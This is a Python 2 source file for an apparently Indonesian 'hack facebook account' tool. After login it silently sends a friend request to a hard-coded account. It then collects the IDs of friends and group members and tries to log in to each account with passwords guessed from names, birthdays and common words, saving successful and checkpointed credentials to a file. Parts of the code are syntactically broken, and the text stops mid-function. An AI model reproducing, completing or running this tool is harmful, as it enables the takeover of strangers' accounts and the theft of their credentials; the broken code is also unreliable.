# coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser

#-Setting-#
########
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]

#-Keluar-#
def keluar():
	print "\033[1;91m[!] Exit"
	os.sys.exit()

#-Animasi-#
def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(00000.1)
                
##### LOGO #####
logo = """\033[1;97m . ___________________
\033[1;97m ▕╮╭┻┻╮╭┻┻╮╭▕╮╲
\033[1;97m ▕╯┃╭╮┃┃╭╮┃╰▕╯╭▏
\033[1;97m ▕╭┻┻┻┛┗┻┻┛   ▕  ╰▏\033[1;97marifisal
\033[1;97m ▕╰━━━┓┈┈┈╭╮▕╭╮▏  \033[1;97m Cirebon
\033[1;97m ▕╭╮╰┳┳┳┳╯╰╯▕╰╯▏
\033[1;97m ▕╰╯┈┗┛┗┛┈╭╮▕╮┈▏   
\033[1;97m╔═══════════════════════════════════════╗
\033[1;97m║ \033[1;97mSelamat.Datang.Di.Tools.Kami       ║
\033[1;97m╚═══════════════════════════════════════╝"""

# titik #
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91m[●] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

##### Pilih Login #####
def masuk():
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Login"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Login using token"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit"
	print "\033[1;97m║"
	msuk = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if msuk =="":
		print"\033[1;91m[!] Wrong input"
		keluar()
	elif msuk =="1":
		login()
	elif msuk =="2":
		tokenz()
	elif msuk =="0":
		keluar()
	else:
		print"\033[1;91m[!] Wrong input"
		keluar()

##### LOGIN #####
#================#
def login():
	os.system('reset')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('reset')
		print logo
		print('\033[1;91m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91m[!] No connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
                                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] No connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;91m[!] Login Failed")
			os.system('rm -rf login.txt')
			time.sleep(0.01)
			login()
			
##### TOKEN #####
def tokenz():
	os.system('reset')
	print logo
	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
##### MENU ##########################################
def menu():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('reset')
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('reset')
		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[!] No connection"
		keluar()
	os.system("reset")
        print logo           
        print "\033[1;97m  ╲╲╭━━━━╮"
        print "\033[1;97m  ╭╮┃▆┈┈▆┃╭╮"
        print "\033[1;97m  ┃╰┫▽▽▽┣╯┃"
        print "\033[1;97m  ╰━┫△△△┣━╯"
        print "\033[1;97m  ╲╲┃┈┈┈┈┃"
        print "\033[1;97m  ╲╲┃┈┏┓┈┃"
        print "\033[1;97m  ▔▔╰━╯╰━╯"
        print "\033[1;97m╔═══════════════════════════════════════╗"
        print "\033[1;97m║ \033[1;97mSelamat.Datang.Di.Tools.Kami       ║"
        print "\033[1;97m╚═══════════════════════════════════════╝"
        print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m"
	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id "
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Hack facebook account               "
        print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit the programs          "
#-
def pilih():
	zedd = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if zedd =="":
		print "\033[1;91m[!] Wrong input"
		pilih()
	elif zedd =="1":
		informasi()
	elif zedd =="2":
		dump()
	elif zedd =="3":
		menu_hack()
	elif zedd =="4":
		menu_bot()
	elif zedd =="5":
		lain()
	elif zedd =="6":
		os.system('reset')
		print logo
		toket=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;92mYour token\033[1;91m :\033[1;97m "+toket
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
        elif zedd =="7":
                os.system('reset')
                print logo
                print 40 * '\033[1;97m\xe2\x95\x90'
                os.system('git pull origin master')
                raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
                menu()
	elif zedd =="8":
		os.remove('out')
	elif zedd =="9":
		os.system('rm -rf login.txt')
		os.system('xdg-open https://www.facebook.com/rizz.magizz')
		keluar()
	elif zedd =="0":
		keluar()
	else:
		print "\033[1;91m[!] Wrong input"
		pilih()
	
##### MENU HACK #####
def menu_hack():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
        print "\033[1;97m   ┊┊╭━━━╮┊┊╭━━━╮┊┊"
        print "\033[1;97m   ┊┊┃┈▋▋┃┊┊┃▋▋┈┃┊┊"
        print "\033[1;97m   ┏━╯┈┈┈◣┊┊◢┈┈┈╰━┓"
        print "\033[1;97m   ┃┗━╯┈┈┃┊┊┃┈┈╰━┛┃"
        print "\033[1;97m   ╰━┳━┳━╯┊┊╰━┳━┳━╯"
        print "\033[1;97m   ━━┻━┻━━━━━━┻━┻━━"
        print "\033[1;97m╔═══════════════════════════════════════╗"
        print "\033[1;97m║ \033[1;97mSelamat.Datang.Di.Tools.Kami       ║"
        print "\033[1;97m╚═══════════════════════════════════════╝"
        print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Hack Target(\033[1;92mTarget\033[1;97m)"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Cloning facebook"
        print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit"
        hack_pilih()
#----pilih
def hack_pilih():
	hack = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if hack=="":
		print "\033[1;91m[!] Wrong input"
		hack_pilih()
	elif hack =="1":
		mini()
	elif hack =="2":
		crack()
		hasil()
	elif hack =="3":
		super()
	elif hack =="4":
		brute()
	elif hack =="5":
		menu_yahoo()
	elif hack =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		hack_pilih()
		
##### MINI HF #####
def mini():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mThe target account must be friends\n       with your account first!"
	print 42*"\033[1;97m═"
	try:
		id = raw_input("\033[1;91m[+] \033[1;92mTarget ID \033[1;91m:\033[1;97m ")
		jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		a = json.loads(r.text)
		print '\033[1;91m[➹] \033[1;92mName\033[1;97m : '+a['name']
		jalan('\033[1;91m[+] \033[1;92mCheck \033[1;97m...')
		time.sleep(2)
		jalan('\033[1;91m[+] \033[1;92mOpen password \033[1;97m...')
		time.sleep(2)
		print 42*"\033[1;97m═"
		pz1 = a['first_name']+'123'
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		y = json.load(data)
		if 'access_token' in y:
			print "\033[1;91m[+] \033[1;92mFound"
			print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
			print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
			print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu_hack()
		else:
			if 'www.facebook.com' in y["error_msg"]:
				print "\033[1;91m[+] \033[1;92mFound"
				print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
				print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
				print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
				print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
				raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
				menu_hack()
			else:
				pz2 = a['first_name'] + '12345'
				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				y = json.load(data)
				if 'access_token' in y:
					print "\033[1;91m[+] \033[1;92mFound"
					print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
					print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
					print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
					raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
					menu_hack()
				else:
					if 'www.facebook.com' in y["error_msg"]:
						print "\033[1;91m[+] \033[1;92mFound"
						print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
						print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
						print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
						print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
						raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
						menu_hack()
					else:
						pz3 = a['last_name'] + '123'
						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
						y = json.load(data)
						if 'access_token' in y:
							print "\033[1;91m[+] \033[1;92mFound"
							print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
							print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
							print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
							raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
							menu_hack()
						else:
							if 'www.facebook.com' in y["error_msg"]:
								print "\033[1;91m[+] \033[1;92mFound"
								print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
								print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
								print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
								print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
								raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
								menu_hack()
							else:
								lahir = a['birthday']
								pz4 = lahir.replace('/', '')
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								y = json.load(data)
								if 'access_token' in y:
									print "\033[1;91m[+] \033[1;92mFound"
									print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
									print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
									print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
									raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
									menu_hack()
								else:
									if 'www.facebook.com' in y["error_msg"]:
										print "\033[1;91m[+] \033[1;92mFound"
										print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
										print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
										print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
										raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
										menu_hack()
									else:
										lahirs = a['birthday']
										gaz = lahirs.replace('/', '')
										pz5 = a['first_name']+gaz
										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
										y = json.load(data)
										if 'access_token' in y:
											print "\033[1;91m[+] \033[1;92mFound"
											print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
											print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
											print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
											raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
											menu_hack()
										else:
											if 'www.facebook.com' in y["error_msg"]:
												print "\033[1;91m[+] \033[1;92mFound"
												print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
												print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
												print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
												print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
												menu_hack()
											else:
												pz6 = "bintang123"
												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
												y = json.load(data)
												if 'access_token' in y:
													print "\033[1;91m[+] \033[1;92mFound"
													print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
													print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
													print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
													raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
													menu_hack()
												else:
													if 'www.facebook.com' in y["error_msg"]:
														print "\033[1;91m[+] \033[1;92mFound"
														print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
														print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
														print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
														print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
														menu_hack()
													else:
														pz7 = "sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia"
														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
														y = json.load(data)
														if 'access_token' in y:
															print "\033[1;91m[+] \033[1;92mFound"
															print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
															print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
															print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
															raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
															menu_hack()
														else:
															if 'www.facebook.com' in y["error_msg"]:
																print "\033[1;91m[+] \033[1;92mFound"
																print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
																print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
																print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
																menu_hack()
															else:
																print "\033[1;91m[!] Sorry, failed to open the target password :("
																print "\033[1;91m[!] try it another way."
																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
																menu_hack()
	except KeyError:
		print "\033[1;91m[!] Terget not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_hack()

def hasil():
	print
	print 42*"\033[1;97m═"
	###Berhasil
	for b in berhasil:
		print(b)
	###CEK
	for c in cekpoint:
		print(c)
	###Gagal
	print 42*"\033[1;97m═"
	print ("\033[31m[x] Failed \033[1;97m--> " + str(len(gagal)))
	keluar()
	
############### SUPER MBF ################
def super():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.0)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Crack with list friend"
        print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	pilih_super()

def pilih_super():
	peak = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if peak =="":
		print "\033[1;91m[!] Wrong input"
		pilih_super()
	elif peak =="1":
		os.system('reset')
		print logo
		jalan('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;92mGet all id from friend \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('reset')
		print logo
		idg=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=9999999999999&access_token='+toket)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
        elif peak == "4":
                os.system('reset')
                print logo
                try:
                        idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')
                        for line in open(idlist,'r').readlines():
                                id.append(line.strip())
                except KeyError:
                        print '\033[1;91m[!] File not found'
                        raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
                        super()
	elif peak =="0":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong input"
		pilih_super()
		
        print "\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
        jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
        print 42*"\033[1;97m═"
	
			
	##### crack #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			#Pass1
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass1+" =>"+z['name'])
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					cek = open("out/super_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					#Pass2
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
						z = json.loads(x.text)
						print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass2+" =>"+z['name'])
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							#Pass3
							pass3 = b['last_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								z = json.loads(x.text)
								print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass3+" =>"+z['name'])
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									#Pass4
									lahir = b['birthday']
									pass4 = lahir.replace('/', '')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										z = json.loads(x.text)
										print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass4+" =>"+z['name'])
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											#Pass5
											pass5 = "sayang123","sayangku123"
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
												z = json.loads(x.text)
												print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass5+" =>"+z['name'])
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													#Pass6
													pass6 = "bintang123","bintang12345"
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
														z = json.loads(x.text)
														print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass6+" =>"+z['name'])
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															cek = open("out/super_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															#Pass7
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = "sayang","doraemon","bintang","someone","bajingan","anjing","pukimak","playboy"
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
																z = json.loads(x.text)
																print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass7+" =>"+z['name'])
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	cek = open("out/super_cp.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
                                                                                                                                else:
